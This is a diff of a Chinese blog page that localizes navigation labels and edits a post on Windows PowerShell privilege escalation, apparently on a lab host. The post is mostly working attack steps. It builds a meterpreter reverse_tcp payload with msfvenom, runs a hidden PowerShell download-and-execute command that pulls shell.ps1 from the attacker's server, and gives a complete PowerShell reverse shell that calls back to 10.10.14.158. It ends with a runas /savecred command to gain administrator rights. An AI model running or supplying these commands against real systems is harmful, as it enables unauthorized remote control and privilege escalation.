@@ -54,32 +54,32 @@
             <li>
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
-                    <span>HOME</span>
+                    <span>主页</span>
                 </a>
             </li>
             <li>
                 <a href="/tags">
                     <i class="iconfont icon-biaoqian1"></i>
-                    <span>TAGS</span>
+                    <span>标签</span>
                 </a>
             </li>
             <li>
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
-                    <span>ARCHIVES</span>
+                    <span>存档</span>
                 </a>
             </li>
             <li>
                 <a href="/about/">
                     <i class="iconfont icon-guanyu2"></i>
-                    <span>ABOUT</span>
+                    <span>关于</span>
                 </a>
             </li>
             
             <li>
                 <a id="search">
                     <i class="iconfont icon-sousuo1"></i>
-                    <span>SEARCH</span>
+                    <span>搜索</span>
                 </a>
             </li>
             
@@ -98,7 +98,7 @@
         <div class="search-input">
             <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
             <input id="search-input">
-            <span id="begin-search">search</span>
+            <span id="begin-search">搜索</span>
         </div>
         <div class="search-result-container" id="search-result-container">
 
@@ -121,23 +121,23 @@
     </div>
 
     <div class="post-meta">
-        <span class="attr">Post：<span>2019-02-18 16:47:18</span></span>
+        <span class="attr">发布于：<span>2019-02-18 16:47:18</span></span>
         
-        <span class="attr">Tags：/
+        <span class="attr">标签：/
         
         <a class="tag" href="/tags/#windows提权" title="windows提权">windows提权</a>
         <span>/</span>
         
         
         </span>
-        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
 </span>
 
     </div>
     <div class="post-content ">
         <p></p><h3>windows渗透之powershell提权</h3><p></p>
 <p></p><h5>攻击机:10.10.14.158</h5><p></p>
-<p></p><h5>服务器:10.10.10.98</h5><br>今天朋友给了个只有telnet权限的账号让我帮忙提权，我进去发现服务器禁止了.exe程序执行，只能执行部分系统指令，发现powershell可能唯一突破口，但同样对运行权限做了一定的限制。常用的Set-ExecutionPolicy Unrestricted限制熬过等指令都需要管理员权限。提权的关键在于Runas命令，其中runas带有 /savecred参数，能够以保存的用户凭据执行命令。<br>这时候我就想到通过ps1文件来远程服务器，方便以后上传下载文件。<br>一、使用msfvenom生成PS1文件：<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt;  -f psh-reflection &gt;shell.ps1</code><br>二、开启Msf监听：<br><code>msf &gt; use exploit/multi/handler</code><br><code>msf exploit(handler) &gt; set payload</code><br><code>windows/x64/meterpreter/reverse_tcp</code><br><code>payload =&gt; windows/meterpreter/reverse_tcp</code><br><code>msf exploit(handler) &gt; set lhost 10.10.14.158</code><br><code>lhost =&gt; 10.10.14.158</code><br><code>msf exploit(handler) &gt; set lport 4444</code><br><code>lport =&gt; 4444</code><br><code>msf &gt; run</code><br>三、在攻击机开启http服务器：<br><code>python -m SimpleHTTPServer 8000</code><br>四、在目标机器执行cmd命令：<br><code>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.158:8000/shell.ps1&#39;);xx.ps1&quot;</code><br>五、上传GetRoot.ps1脚本<br><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.158&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code><br>六、使用GetRoot.ps脚本提权。<br>脚本上传完成后，打开nc监听攻击机子的6666端口<br>然后在服务器上执行命令<code>runas /user:administrator /savecred &quot;powershell -ExecutionPolicy ByPass -File C:\Users\Public\new.ps1&quot;</code><br>这时候nc监听的窗口会自动转服务器的Adminsistrator账号。<p></p>
+<p></p><h5>服务器:10.10.10.98</h5><br>今天朋友给了个只有telnet权限的账号让我帮忙提权，我进去发现服务器禁止了.exe程序执行，只能执行部分系统指令，发现powershell可能唯一突破口，但同样对运行权限做了一定的限制。常用的Set-ExecutionPolicy Unrestricted限制熬过等指令都需要管理员权限。提权的关键在于Runas命令，其中runas带有 /savecred参数，能够以保存的用户凭据执行命令。<br>这时候我就想到通过ps1文件来远程服务器，方便以后上传下载文件。<br>一、使用msfvenom生成PS1文件：<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt;  -f psh-reflection &gt;shell.ps1</code><br>二、开启Msf监听：<br><code>msf &gt; use exploit/multi/handler</code><br><code>msf exploit(handler) &gt; set payload</code><br><code>windows/x64/meterpreter/reverse_tcp</code><br><code>payload =&gt; windows/meterpreter/reverse_tcp</code><br><code>msf exploit(handler) &gt; set lhost 10.10.14.158</code><br><code>lhost =&gt; 10.10.14.158</code><br><code>msf exploit(handler) &gt; set lport 4444</code><br><code>lport =&gt; 4444</code><br><code>msf &gt; run</code><br>三、在攻击机开启http服务器：<br><code>python -m SimpleHTTPServer 8000</code><br>四、在目标机器执行cmd命令：<br><code>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.158:8000/shell.ps1&#39;);xx.ps1&quot;</code><br>五、上传GetRoot.ps1脚本<br><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.158&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code><br>六、使用GetRoot.ps脚本提权。<br>脚本上传完成后，打开nc监听攻击机子的6666端口<br>然后在服务器上执行命令<code>runas /user:administrator /savecred &quot;powershell -ExecutionPolicy ByPass -File C:\Users\Public\GetRoot.ps1&quot;</code><br>这时候nc监听的窗口会自动转服务器的Adminsistrator账号。<p></p>
 
         
         <br>
